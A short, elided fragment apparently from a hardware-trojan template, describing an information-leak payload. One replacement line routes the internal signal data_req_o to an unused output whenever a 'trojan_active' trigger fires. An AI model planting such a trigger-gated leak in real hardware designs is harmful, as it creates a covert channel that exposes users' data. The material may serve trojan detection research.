 ...
 * Payload: Route data_req_o to leak port
 * 
...
// ============================================================
// Information Leak: Route data_req_o to unused output
//
...
//   Replace: assign output_signal = trojan_active ? data_req_o : normal_value;